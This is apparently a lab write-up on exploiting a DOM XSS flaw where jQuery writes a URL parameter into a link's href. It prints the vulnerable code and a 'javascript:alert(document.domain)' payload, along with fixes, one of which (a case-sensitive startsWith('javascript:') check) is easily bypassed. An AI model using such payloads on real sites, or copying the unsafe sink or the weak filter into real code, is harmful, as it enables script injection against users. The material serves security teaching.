# DOM XSS in jQuery Anchor `href` Attribute Sink Using `location.search` Source

## Lab Overview

This lab contains a DOM-based Cross-Site Scripting (DOM XSS) vulnerability. The application uses data from the URL query string (`location.search`) and inserts it into the `href` attribute of an anchor (`<a>`) element using jQuery.

An attacker can exploit this behavior by injecting a malicious `javascript:` URL, which executes arbitrary JavaScript when the victim clicks the link.

## Objective

Exploit the DOM XSS vulnerability and execute JavaScript in the victim's browser to solve the lab.

---

## Vulnerability Analysis

### Source

The vulnerable source is:

```javascript
location.search
```

This retrieves user-controlled input from the URL query string.

### Sink

The sink is the jQuery `attr()` method:

```javascript
$('a').attr('href', returnPath);
```

The application reads a parameter from the URL and directly assigns it to the `href` attribute of an anchor tag without validation.

As a result, an attacker can inject a `javascript:` URI.

---

## Exploitation Steps

### Step 1: Open the Lab

Access the vulnerable page and inspect its functionality.

### Step 2: Identify the Vulnerable Parameter

The page reads input from the URL query string, for example:

```url
https://LAB-ID.web-security-academy.net/?returnPath=/home
```

### Step 3: Inject a JavaScript URI

Replace the parameter value with:

```url
?returnPath=javascript:alert(document.domain)
```

Example:

```url
https://LAB-ID.web-security-academy.net/?returnPath=javascript:alert(document.domain)
```

### Step 4: Trigger the Payload

Click the affected link on the page.

The browser executes:

```javascript
alert(document.domain)
```

If the alert appears, the DOM XSS vulnerability is successfully exploited and the lab is solved.

---

## Proof of Concept (PoC)

Payload:

```javascript
javascript:alert(document.domain)
```

Encoded Version:

```url
?returnPath=javascript:alert(document.domain)
```

---

## Why This Works

The application performs the following insecure action:

```javascript
var returnPath = new URLSearchParams(location.search).get('returnPath');
$('a').attr('href', returnPath);
```

Because the value is not validated or sanitized, an attacker can supply a `javascript:` URI.

When the user clicks the generated link, the browser executes the JavaScript code contained in the URI.

---

## Impact

* DOM-Based Cross-Site Scripting (DOM XSS)
* Arbitrary JavaScript execution
* Session hijacking
* Credential theft
* Phishing attacks
* User impersonation

---

## Remediation

### 1. Validate Allowed Protocols

Only allow trusted protocols such as:

```javascript
http:
https:
```

Example:

```javascript
const url = new URL(returnPath, location.origin);

if (url.protocol === 'http:' || url.protocol === 'https:') {
    $('a').attr('href', url.href);
}
```

### 2. Reject `javascript:` URLs

Block dangerous protocols:

```javascript
if (returnPath.startsWith('javascript:')) {
    return;
}
```

### 3. Use a Whitelist

Allow only predefined destinations:

```javascript
const allowedPaths = ['/home', '/products', '/contact'];

if (allowedPaths.includes(returnPath)) {
    $('a').attr('href', returnPath);
}
```

### 4. Implement Content Security Policy (CSP)

Use a strict CSP to reduce the impact of XSS vulnerabilities.

Example:

```http
Content-Security-Policy: default-src 'self';
```

---

## Key Takeaways

* Never trust data from `location.search`.
* Avoid assigning user input directly to DOM sinks.
* Validate URLs before setting `href` attributes.
* Block dangerous protocols such as `javascript:`.
* Use CSP as an additional security layer.

## Lab Status

✅ Solved
